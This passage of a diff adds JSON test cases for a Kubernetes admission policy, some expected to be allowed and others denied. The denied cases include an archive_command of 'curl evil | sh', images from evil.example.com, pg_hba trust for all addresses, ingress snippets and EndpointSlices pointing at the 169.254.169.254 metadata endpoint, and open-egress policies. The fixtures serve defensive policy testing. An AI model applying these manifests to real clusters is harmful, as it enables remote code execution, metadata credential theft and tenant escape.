+        "mountPath": "/opt/pgbackrest",
+        "name": "pgbackrest-bin"
+       }
+      ]
+     },
+     {
+      "command": [
+       "/bin/sh",
+       "-c",
+       "cp /etc/pgbackrest-config/pgbackrest.conf /etc/pgbackrest/pgbackrest.conf 2\u003e/dev/null || true; sleep infinity"
+      ],
+      "env": [
+       {
+        "name": "POSTGRES_DB",
+        "valueFrom": {
+         "secretKeyRef": {
+          "key": "POSTGRES_DB",
+          "name": "legacy-pg-pg"
+         }
+        }
+       },
+       {
+        "name": "POSTGRES_USER",
+        "valueFrom": {
+         "secretKeyRef": {
+          "key": "POSTGRES_USER",
+          "name": "legacy-pg-pg"
+         }
+        }
+       },
+       {
+        "name": "POSTGRES_PASSWORD",
+        "valueFrom": {
+         "secretKeyRef": {
+          "key": "POSTGRES_PASSWORD",
+          "name": "legacy-pg-pg"
+         }
+        }
+       },
+       {
+        "name": "PGDATA",
+        "value": "/var/lib/postgresql/data/pgdata"
+       },
+       {
+        "name": "PGBACKREST_REPO1_S3_KEY",
+        "valueFrom": {
+         "secretKeyRef": {
+          "key": "R2_ACCESS_KEY",
+          "name": "legacy-pg-pg"
+         }
+        }
+       },
+       {
+        "name": "PGBACKREST_REPO1_S3_KEY_SECRET",
+        "valueFrom": {
+         "secretKeyRef": {
+          "key": "R2_SECRET_KEY",
+          "name": "legacy-pg-pg"
+         }
+        }
+       }
+      ],
+      "image": "woblerr/pgbackrest:2.56.0-alpine",
+      "imagePullPolicy": "IfNotPresent",
+      "name": "pgbackrest",
+      "volumeMounts": [
+       {
+        "mountPath": "/var/lib/postgresql/data",
+        "name": "data"
+       },
+       {
+        "mountPath": "/etc/pgbackrest-config",
+        "name": "pgbackrest-config"
+       },
+       {
+        "mountPath": "/etc/pgbackrest",
+        "name": "pgbackrest-conf"
+       }
+      ]
+     }
+    ],
+    "initContainers": [
+     {
+      "command": [
+       "/bin/bash",
+       "-c",
+       "set -e \u0026\u0026 if [ -x /shared/pgbackrest ]; then echo \"pgbackrest already installed\"; exit 0; fi \u0026\u0026 echo \"Installing pgbackrest into /shared...\" \u0026\u0026 export DEBIAN_FRONTEND=noninteractive \u0026\u0026 apt-get update -qq \u0026\u0026 apt-get install -y --no-install-recommends pgbackrest \u0026\u0026 cp \"$(command -v pgbackrest)\" /shared/pgbackrest \u0026\u0026 chmod 0755 /shared/pgbackrest \u0026\u0026 echo \"done\""
+      ],
+      "image": "postgres:17",
+      "imagePullPolicy": "IfNotPresent",
+      "name": "pgbackrest-install",
+      "volumeMounts": [
+       {
+        "mountPath": "/shared",
+        "name": "pgbackrest-bin"
+       }
+      ]
+     }
+    ],
+    "volumes": [
+     {
+      "name": "data",
+      "persistentVolumeClaim": {
+       "claimName": "legacy-pg-data"
+      }
+     },
+     {
+      "configMap": {
+       "defaultMode": 493,
+       "name": "legacy-pg-pgbackrest"
+      },
+      "name": "pgbackrest-config"
+     },
+     {
+      "emptyDir": {},
+      "name": "pgbackrest-conf"
+     },
+     {
+      "emptyDir": {},
+      "name": "pgbackrest-bin"
+     }
+    ]
+   }
+  },
+  "warns": "orchard-tenant-pods-hardening"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/pod-tailscale-proxy",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "app.kubernetes.io/name": "ts--proxy--app",
+     "orchard.my/tailscale": "true",
+     "orchard.my/target-deployment": "app",
+     "pod-template-hash": "7d9f8c5b6"
+    },
+    "name": "ts--proxy--app-7d9f8c5b6-x2k4p",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "env": [
+       {
+        "name": "TS_AUTHKEY",
+        "valueFrom": {
+         "secretKeyRef": {
+          "key": "TS_AUTHKEY",
+          "name": "ts--key--app"
+         }
+        }
+       },
+       {
+        "name": "TS_HOSTNAME",
+        "value": "host"
+       },
+       {
+        "name": "TS_STATE_DIR",
+        "value": "/var/lib/tailscale"
+       },
+       {
+        "name": "TS_USERSPACE",
+        "value": "true"
+       },
+       {
+        "name": "TS_KUBE_SECRET",
+        "value": "ts--state--app"
+       },
+       {
+        "name": "TS_SERVE_CONFIG",
+        "value": "/config/serve-config.json"
+       },
+       {
+        "name": "POD_NAME",
+        "valueFrom": {
+         "fieldRef": {
+          "fieldPath": "metadata.name"
+         }
+        }
+       },
+       {
+        "name": "POD_UID",
+        "valueFrom": {
+         "fieldRef": {
+          "fieldPath": "metadata.uid"
+         }
+        }
+       }
+      ],
+      "image": "ghcr.io/tailscale/tailscale:latest",
+      "imagePullPolicy": "IfNotPresent",
+      "name": "tailscale",
+      "resources": {
+       "limits": {
+        "cpu": "100m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "10m",
+        "memory": "64Mi"
+       }
+      },
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       },
+       "runAsGroup": 1000,
+       "runAsNonRoot": true,
+       "runAsUser": 1000,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "volumeMounts": [
+       {
+        "mountPath": "/var/lib/tailscale",
+        "name": "tailscale-state"
+       },
+       {
+        "mountPath": "/config",
+        "name": "serve-config",
+        "readOnly": true
+       }
+      ]
+     }
+    ],
+    "runtimeClassName": "gvisor",
+    "serviceAccountName": "ts--proxy--app",
+    "volumes": [
+     {
+      "emptyDir": {},
+      "name": "tailscale-state"
+     },
+     {
+      "configMap": {
+       "name": "ts--serve--app"
+      },
+      "name": "serve-config"
+     }
+    ]
+   }
+  }
+ },
+ {
+  "expect": "allow",
+  "name": "benign/pvc-app-clusterip",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "PersistentVolumeClaim",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard"
+    },
+    "name": "app-clusterip-data",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "accessModes": [
+     "ReadWriteOnce"
+    ],
+    "resources": {
+     "requests": {
+      "storage": "5Gi"
+     }
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/pvc-app-nodeport",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "PersistentVolumeClaim",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard"
+    },
+    "name": "app-nodeport-data",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "accessModes": [
+     "ReadWriteOnce"
+    ],
+    "resources": {
+     "requests": {
+      "storage": "5Gi"
+     }
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "groups": "system:serviceaccounts,system:serviceaccounts:postgresql,system:authenticated",
+  "name": "benign/pvc-cnpg-data",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "PersistentVolumeClaim",
+   "metadata": {
+    "labels": {
+     "cnpg.io/cluster": "db",
+     "cnpg.io/pvcRole": "PG_DATA"
+    },
+    "name": "db-1",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "accessModes": [
+     "ReadWriteOnce"
+    ],
+    "resources": {
+     "requests": {
+      "storage": "500Gi"
+     }
+    },
+    "storageClassName": "longhorn"
+   }
+  },
+  "user": "system:serviceaccount:postgresql:cloudnative-pg"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/pvc-restore-400gi",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "PersistentVolumeClaim",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard"
+    },
+    "name": "restored-data",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "accessModes": [
+     "ReadWriteOnce"
+    ],
+    "resources": {
+     "requests": {
+      "storage": "400Gi"
+     }
+    },
+    "storageClassName": "longhorn",
+    "volumeMode": "Filesystem"
+   }
+  },
+  "set": "maxPvcSize=",
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/rolebinding-tailscale",
+  "object": {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "RoleBinding",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "orchard.my/tailscale": "true",
+     "orchard.my/target-deployment": "app"
+    },
+    "name": "ts--proxy--app",
+    "namespace": "orchard-policy-test"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "Role",
+    "name": "ts--proxy--app"
+   },
+   "subjects": [
+    {
+     "kind": "ServiceAccount",
+     "name": "ts--proxy--app",
+     "namespace": "orchard-policy-test"
+    }
+   ]
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/rolebinding-tenant-secrets",
+  "object": {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "RoleBinding",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "leaf",
+     "app.kubernetes.io/name": "server"
+    },
+    "name": "orchard-server-tenant-secrets",
+    "namespace": "orchard-policy-test"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "Role",
+    "name": "orchard-server-tenant-secrets"
+   },
+   "subjects": [
+    {
+     "kind": "ServiceAccount",
+     "name": "orchard-server",
+     "namespace": "orchard"
+    }
+   ]
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/service-acme-solver",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "labels": {
+     "acme.cert-manager.io/http01-solver": "true"
+    },
+    "name": "cm-acme-http-solver-abcde",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ports": [
+     {
+      "port": 8089,
+      "targetPort": 8089
+     }
+    ],
+    "selector": {
+     "acme.cert-manager.io/http01-solver": "true"
+    },
+    "type": "NodePort"
+   }
+  },
+  "user": "system:serviceaccount:cert-manager:cert-manager"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/service-app-clusterip",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "app.kubernetes.io/name": "app-clusterip"
+    },
+    "name": "app-clusterip",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ports": [
+     {
+      "name": "http",
+      "port": 80,
+      "protocol": "TCP",
+      "targetPort": 8080
+     }
+    ],
+    "selector": {
+     "app.kubernetes.io/name": "app-clusterip"
+    },
+    "type": "ClusterIP"
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/service-app-nodeport",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "app.kubernetes.io/name": "app-nodeport"
+    },
+    "name": "app-nodeport",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ports": [
+     {
+      "name": "http",
+      "port": 80,
+      "protocol": "TCP",
+      "targetPort": 8080
+     }
+    ],
+    "selector": {
+     "app.kubernetes.io/name": "app-nodeport"
+    },
+    "type": "NodePort"
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "groups": "system:serviceaccounts,system:serviceaccounts:postgresql,system:authenticated",
+  "name": "benign/service-cnpg-rw",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "labels": {
+     "cnpg.io/cluster": "db"
+    },
+    "name": "db-rw",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ports": [
+     {
+      "name": "postgres",
+      "port": 5432,
+      "targetPort": 5432
+     }
+    ],
+    "selector": {
+     "cnpg.io/cluster": "db",
+     "cnpg.io/instanceRole": "primary"
+    },
+    "type": "ClusterIP"
+   }
+  },
+  "user": "system:serviceaccount:postgresql:cloudnative-pg"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/service-protection-proxy-app",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "labels": {
+     "orchard.my/managed": "true",
+     "orchard.my/type": "protection-proxy"
+    },
+    "name": "myapp-protection-proxy",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "clusterIP": "None",
+    "ports": [
+     {
+      "port": 3001,
+      "protocol": "TCP",
+      "targetPort": 3001
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/service-protection-proxy",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "labels": {
+     "orchard.my/managed": "true",
+     "orchard.my/type": "protection-proxy"
+    },
+    "name": "orchard-protection-proxy",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "clusterIP": "None",
+    "ports": [
+     {
+      "port": 3001,
+      "protocol": "TCP",
+      "targetPort": 3001
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/service-public-db-lb",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "annotations": {
+     "lbipam.cilium.io/sharing-cross-namespace": "*",
+     "lbipam.cilium.io/sharing-key": "shared-203-0-113-7"
+    },
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "cnpg.io/cluster": "db"
+    },
+    "name": "db-public",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "externalTrafficPolicy": "Cluster",
+    "loadBalancerIP": "203.0.113.7",
+    "ports": [
+     {
+      "name": "postgres",
+      "port": 31235,
+      "protocol": "TCP",
+      "targetPort": 5432
+     }
+    ],
+    "selector": {
+     "cnpg.io/cluster": "db",
+     "cnpg.io/instanceRole": "primary"
+    },
+    "type": "LoadBalancer"
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/service-public-port-lb",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "annotations": {
+     "lbipam.cilium.io/sharing-cross-namespace": "*",
+     "lbipam.cilium.io/sharing-key": "shared-203-0-113-7"
+    },
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "app.kubernetes.io/name": "app",
+     "orchard.my/public-deployment": "app"
+    },
+    "name": "app-pub-t31234",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "externalTrafficPolicy": "Cluster",
+    "loadBalancerIP": "203.0.113.7",
+    "ports": [
+     {
+      "name": "pub-tcp-31234",
+      "port": 31234,
+      "protocol": "TCP",
+      "targetPort": 8080
+     }
+    ],
+    "selector": {
+     "app.kubernetes.io/name": "app"
+    },
+    "type": "LoadBalancer"
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "OS-command",
+  "expect": "deny",
+  "name": "hostile/cnpg-archive-command",
+  "object": {
+   "apiVersion": "postgresql.cnpg.io/v1",
+   "kind": "Cluster",
+   "metadata": {
+    "name": "db",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "instances": 1,
+    "postgresql": {
+     "parameters": {
+      "archive_command": "curl evil | sh"
+     }
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "env/envFrom",
+  "expect": "deny",
+  "name": "hostile/cnpg-env",
+  "object": {
+   "apiVersion": "postgresql.cnpg.io/v1",
+   "kind": "Cluster",
+   "metadata": {
+    "name": "db",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "env": [
+     {
+      "name": "X",
+      "value": "y"
+     }
+    ],
+    "instances": 1
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "image must come",
+  "expect": "deny",
+  "name": "hostile/cnpg-foreign-image",
+  "object": {
+   "apiVersion": "postgresql.cnpg.io/v1",
+   "kind": "Cluster",
+   "metadata": {
+    "name": "db",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "imageName": "evil.example.com/pg:17",
+    "instances": 1
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "pg_hba",
+  "expect": "deny",
+  "name": "hostile/cnpg-pg-hba",
+  "object": {
+   "apiVersion": "postgresql.cnpg.io/v1",
+   "kind": "Cluster",
+   "metadata": {
+    "name": "db",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "instances": 1,
+    "postgresql": {
+     "pg_hba": [
+      "host all all 0.0.0.0/0 trust"
+     ]
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "postInit",
+  "expect": "deny",
+  "name": "hostile/cnpg-postinit-sql",
+  "object": {
+   "apiVersion": "postgresql.cnpg.io/v1",
+   "kind": "Cluster",
+   "metadata": {
+    "name": "db",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "bootstrap": {
+     "initdb": {
+      "postInitSQL": [
+       "create extension x"
+      ]
+     }
+    },
+    "instances": 1
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "managed roles",
+  "expect": "deny",
+  "name": "hostile/cnpg-superuser-role",
+  "object": {
+   "apiVersion": "postgresql.cnpg.io/v1",
+   "kind": "Cluster",
+   "metadata": {
+    "name": "db",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "instances": 1,
+    "managed": {
+     "roles": [
+      {
+       "name": "r",
+       "superuser": true
+      }
+     ]
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "protection-proxy EndpointSlices",
+  "expect": "deny",
+  "name": "hostile/endpointslice-server-wrong-ip",
+  "object": {
+   "addressType": "IPv4",
+   "apiVersion": "discovery.k8s.io/v1",
+   "endpoints": [
+    {
+     "addresses": [
+      "169.254.169.254"
+     ]
+    }
+   ],
+   "kind": "EndpointSlice",
+   "metadata": {
+    "name": "orchard-protection-proxy-1",
+    "namespace": "orchard-policy-test"
+   },
+   "ports": [
+    {
+     "port": 80
+    }
+   ]
+  },
+  "set": "protectionProxyIPs=10.43.1.2",
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "protection-proxy EndpointSlices",
+  "expect": "deny",
+  "name": "hostile/endpointslice-server-wrong-name",
+  "object": {
+   "addressType": "IPv4",
+   "apiVersion": "discovery.k8s.io/v1",
+   "endpoints": [
+    {
+     "addresses": [
+      "10.0.0.9"
+     ]
+    }
+   ],
+   "kind": "EndpointSlice",
+   "metadata": {
+    "name": "victim-hijack",
+    "namespace": "orchard-policy-test"
+   },
+   "ports": [
+    {
+     "port": 80
+    }
+   ]
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "allow-list",
+  "expect": "deny",
+  "name": "hostile/ingress-class-annotation",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "annotations": {
+     "kubernetes.io/ingress.class": "other"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingressClassName": "haproxy",
+    "rules": [
+     {
+      "host": "a.example.com",
+      "http": {
+       "paths": [
+        {
+         "backend": {
+          "service": {
+           "name": "s",
+           "port": {
+            "number": 80
+           }
+          }
+         },
+         "path": "/",
+         "pathType": "Prefix"
+        }
+       ]
+      }
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "issuer must be",
+  "expect": "deny",
+  "name": "hostile/ingress-foreign-clusterissuer",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "annotations": {
+     "cert-manager.io/cluster-issuer": "internal-ca"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingressClassName": "haproxy",
+    "rules": [
+     {
+      "host": "a.example.com",
+      "http": {
+       "paths": [
+        {
+         "backend": {
+          "service": {
+           "name": "s",
+           "port": {
+            "number": 80
+           }
+          }
+         },
+         "path": "/",
+         "pathType": "Prefix"
+        }
+       ]
+      }
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "allow-list",
+  "expect": "deny",
+  "name": "hostile/ingress-haproxy-snippet",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "annotations": {
+     "haproxy.org/backend-config-snippet": "server evil 169.254.169.254:80"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingressClassName": "haproxy",
+    "rules": [
+     {
+      "host": "a.example.com",
+      "http": {
+       "paths": [
+        {
+         "backend": {
+          "service": {
+           "name": "s",
+           "port": {
+            "number": 80
+           }
+          }
+         },
+         "path": "/",
+         "pathType": "Prefix"
+        }
+       ]
+      }
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "allow-list",
+  "expect": "deny",
+  "name": "hostile/ingress-issuer-kind",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "annotations": {
+     "cert-manager.io/issuer-kind": "ClusterIssuer"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingressClassName": "haproxy",
+    "rules": [
+     {
+      "host": "a.example.com",
+      "http": {
+       "paths": [
+        {
+         "backend": {
+          "service": {
+           "name": "s",
+           "port": {
+            "number": 80
+           }
+          }
+         },
+         "path": "/",
+         "pathType": "Prefix"
+        }
+       ]
+      }
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "allow-list",
+  "expect": "deny",
+  "name": "hostile/ingress-namespaced-issuer",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "annotations": {
+     "cert-manager.io/issuer": "x"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingressClassName": "haproxy",
+    "rules": [
+     {
+      "host": "a.example.com",
+      "http": {
+       "paths": [
+        {
+         "backend": {
+          "service": {
+           "name": "s",
+           "port": {
+            "number": 80
+           }
+          }
+         },
+         "path": "/",
+         "pathType": "Prefix"
+        }
+       ]
+      }
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "allow-list",
+  "expect": "deny",
+  "name": "hostile/ingress-nginx-snippet",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "annotations": {
+     "nginx.ingress.kubernetes.io/server-snippet": "x"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingressClassName": "haproxy",
+    "rules": [
+     {
+      "host": "a.example.com",
+      "http": {
+       "paths": [
+        {
+         "backend": {
+          "service": {
+           "name": "s",
+           "port": {
+            "number": 80
+           }
+          }
+         },
+         "path": "/",
+         "pathType": "Prefix"
+        }
+       ]
+      }
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "resource backends",
+  "expect": "deny",
+  "name": "hostile/ingress-resource-backend",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "annotations": {},
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "defaultBackend": {
+     "resource": {
+      "apiGroup": "x",
+      "kind": "Y",
+      "name": "z"
+     }
+    },
+    "ingressClassName": "haproxy"
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "ingress class",
+  "expect": "deny",
+  "name": "hostile/ingress-wrong-class",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "annotations": {},
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingressClassName": "other",
+    "rules": []
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "Pod Security",
+  "expect": "deny",
+  "name": "hostile/namespace-drop-psa",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "labels": {
+     "orchard.my/managed": "true"
+    },
+    "name": "orchard-policy-test"
+   }
+  },
+  "oldObject": {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "labels": {
+     "orchard.my/managed": "true",
+     "pod-security.kubernetes.io/enforce": "baseline"
+    },
+    "name": "orchard-policy-test"
+   }
+  },
+  "operation": "UPDATE",
+  "user": "system:serviceaccount:orchard-policy-test:default"
+ },
+ {
+  "denied-by": "Pod Security",
+  "expect": "deny",
+  "name": "hostile/namespace-loosen-psa",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "labels": {
+     "orchard.my/managed": "true",
+     "pod-security.kubernetes.io/enforce": "privileged"
+    },
+    "name": "orchard-policy-test"
+   }
+  },
+  "oldObject": {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "labels": {
+     "orchard.my/managed": "true",
+     "pod-security.kubernetes.io/enforce": "baseline"
+    },
+    "name": "orchard-policy-test"
+   }
+  },
+  "operation": "UPDATE",
+  "user": "system:serviceaccount:orchard-policy-test:default"
+ },
+ {
+  "denied-by": "cannot be removed",
+  "expect": "deny",
+  "name": "hostile/namespace-remove-managed",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "labels": {
+     "pod-security.kubernetes.io/enforce": "baseline"
+    },
+    "name": "orchard-policy-test"
+   }
+  },
+  "oldObject": {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "labels": {
+     "orchard.my/managed": "true",
+     "pod-security.kubernetes.io/enforce": "baseline"
+    },
+    "name": "orchard-policy-test"
+   }
+  },
+  "operation": "UPDATE",
+  "user": "system:serviceaccount:orchard-policy-test:default"
+ },
+ {
+  "denied-by": "no destination",
+  "expect": "deny",
+  "name": "hostile/networkpolicy-any-peer-all-ports",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "egress": [
+     {}
+    ],
+    "podSelector": {},
+    "policyTypes": [
+     "Egress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "no destination",
+  "expect": "deny",
+  "name": "hostile/networkpolicy-any-peer-nondns",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "egress": [
+     {
+      "ports": [
+       {
+        "port": 6443,
+        "protocol": "TCP"
+       }
+      ],
+      "to": []
+     }
+    ],
+    "podSelector": {},
+    "policyTypes": [
+     "Egress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "ingress from 0.0.0.0/0",
+  "expect": "deny",
+  "name": "hostile/networkpolicy-ingress-open-all-ports",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingress": [
+     {
+      "from": [
+       {
+        "ipBlock": {
+         "cidr": "0.0.0.0/0"
+        }
+       }
+      ]
+     }
+    ],
+    "podSelector": {},
+    "policyTypes": [
+     "Ingress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "0.0.0.0/0 must except",
+  "expect": "deny",
+  "name": "hostile/networkpolicy-open-egress",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "egress": [
+     {
+      "to": [
+       {
+        "ipBlock": {
+         "cidr": "0.0.0.0/0"
+        }
+       }
+      ]
+     }
+    ],
+    "podSelector": {},
+    "policyTypes": [
+     "Egress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "0.0.0.0/0 must except",
+  "expect": "deny",
+  "name": "hostile/networkpolicy-partial-except",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "egress": [
+     {
+      "to": [
+       {
+        "ipBlock": {
+         "cidr": "0.0.0.0/0",
+         "except": [
+          "10.0.0.0/8"
+         ]
+        }
+       }
+      ]
+     }
+    ],
+    "podSelector": {},
+    "policyTypes": [
+     "Egress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "capabilities outside",
+  "expect": "deny",
+  "name": "hostile/pod-cap-net-admin",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
